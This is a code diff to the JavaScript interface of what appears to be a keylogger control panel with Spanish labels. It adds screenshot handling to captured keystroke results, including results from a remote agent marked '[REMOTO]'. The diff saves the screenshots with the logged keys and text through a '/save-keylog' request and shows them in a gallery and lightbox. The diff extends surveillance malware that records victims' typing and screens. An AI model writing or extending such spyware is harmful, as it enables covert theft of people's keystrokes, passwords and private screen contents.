@@ -458,6 +458,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const keyMessage = document.getElementById('key-message');
     let capturedKeys = [];
     let capturedText = '';
+    let capturedScreenshots = [];
 
     keyForm.addEventListener('submit', async (e) => {
         e.preventDefault();
@@ -490,6 +491,7 @@ document.addEventListener('DOMContentLoaded', () => {
             if (data.success) {
                 capturedKeys = data.keys;
                 capturedText = data.captured_text;
+                capturedScreenshots = data.screenshots || [];
                 renderKeyloggerResults(data);
             } else {
                 showMessage(keyMessage, 'error', `❌ ${data.error}`);
@@ -526,13 +528,19 @@ document.addEventListener('DOMContentLoaded', () => {
             const response = await fetch('/save-keylog', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ filepath, keys: capturedKeys, captured_text: capturedText })
+                body: JSON.stringify({
+                    filepath,
+                    keys: capturedKeys,
+                    captured_text: capturedText,
+                    screenshots: capturedScreenshots
+                })
             });
 
             const data = await response.json();
 
             if (data.success) {
-                showMessage(keyMessage, 'success', `✅ Registro guardado en: ${data.filepath} (${data.total_saved} teclas)`);
+                const scr = data.screenshots_saved ? ` | ${data.screenshots_saved} capturas guardadas` : '';
+                showMessage(keyMessage, 'success', `✅ Registro guardado en: ${data.filepath} (${data.total_saved} teclas${scr})`);
             } else {
                 showMessage(keyMessage, 'error', `❌ ${data.error}`);
             }
@@ -556,6 +564,11 @@ document.addEventListener('DOMContentLoaded', () => {
             document.getElementById('key-stat-numbers').textContent = data.stats.numbers;
             document.getElementById('key-stat-special').textContent = data.stats.special;
         }
+
+        // Screenshots stat
+        const totalScr = (data.screenshots || []).length;
+        const scrStatEl = document.getElementById('key-stat-screenshots');
+        if (scrStatEl) scrStatEl.textContent = totalScr;
 
         // Show captured text
         if (data.captured_text) {
@@ -594,6 +607,9 @@ document.addEventListener('DOMContentLoaded', () => {
         }
 
         keyResults.classList.add('visible');
+
+        // Render screenshots
+        renderScreenshots(data.screenshots || []);
     }
 
     function getKeyTypeClass(type) {
@@ -610,6 +626,57 @@ document.addEventListener('DOMContentLoaded', () => {
             'función': 'key-type-especial'
         };
         return map[type] || 'key-type-especial';
+    }
+
+    // ---- Screenshot Gallery ----
+    function renderScreenshots(screenshots) {
+        const section = document.getElementById('key-screenshots-section');
+        const gallery = document.getElementById('key-screenshots-gallery');
+        const info = document.getElementById('key-screenshots-info');
+        if (!gallery || !section) return;
+
+        if (!screenshots || screenshots.length === 0) {
+            section.style.display = 'none';
+            return;
+        }
+
+        info.textContent = `${screenshots.length} captura(s) de pantalla`;
+        gallery.innerHTML = '';
+
+        screenshots.forEach(scr => {
+            const card = document.createElement('div');
+            card.className = 'screenshot-card';
+            card.innerHTML = `
+                <img src="data:image/jpeg;base64,${scr.data}" alt="Captura ${scr.index}" loading="lazy">
+                <div class="screenshot-card__info">
+                    <span class="screenshot-card__index">📸 #${scr.index}</span>
+                    <span>${scr.timestamp || ''}</span>
+                </div>
+            `;
+            card.querySelector('img').addEventListener('click', () => openLightbox(scr.data));
+            gallery.appendChild(card);
+        });
+
+        section.style.display = 'block';
+    }
+
+    // ---- Lightbox ----
+    let lightbox = document.getElementById('screenshot-lightbox');
+    if (!lightbox) {
+        lightbox = document.createElement('div');
+        lightbox.id = 'screenshot-lightbox';
+        lightbox.className = 'screenshot-lightbox';
+        lightbox.innerHTML = `
+            <span class="screenshot-lightbox__close">✕</span>
+            <img id="lightbox-img" src="" alt="Captura ampliada">
+        `;
+        document.body.appendChild(lightbox);
+        lightbox.addEventListener('click', () => lightbox.classList.remove('open'));
+    }
+
+    function openLightbox(b64) {
+        document.getElementById('lightbox-img').src = `data:image/jpeg;base64,${b64}`;
+        lightbox.classList.add('open');
     }
 
     // ---- Utility Functions ----
@@ -963,6 +1030,11 @@ function copyPassword(btn, password) {
             document.getElementById('key-stat-special').textContent = data.stats.special;
         }
 
+        // Screenshot stat
+        const totalScr = (data.screenshots || []).length;
+        const scrStatEl = document.getElementById('key-stat-screenshots');
+        if (scrStatEl) scrStatEl.textContent = totalScr;
+
         capturedTextBox.textContent = data.captured_text || '';
         resultsInfo.textContent = `Duración: ${data.duration}s | Total: ${data.total_keys} teclas [REMOTO]`;
         resultsBody.innerHTML = '';
@@ -985,6 +1057,11 @@ function copyPassword(btn, password) {
             });
         }
         container.classList.add('visible');
+
+        // Render remote screenshots via the shared function
+        if (typeof renderScreenshots === 'function') {
+            renderScreenshots(data.screenshots || []);
+        }
     };
 
     function showAgentBadge(messageEl, type, text) {
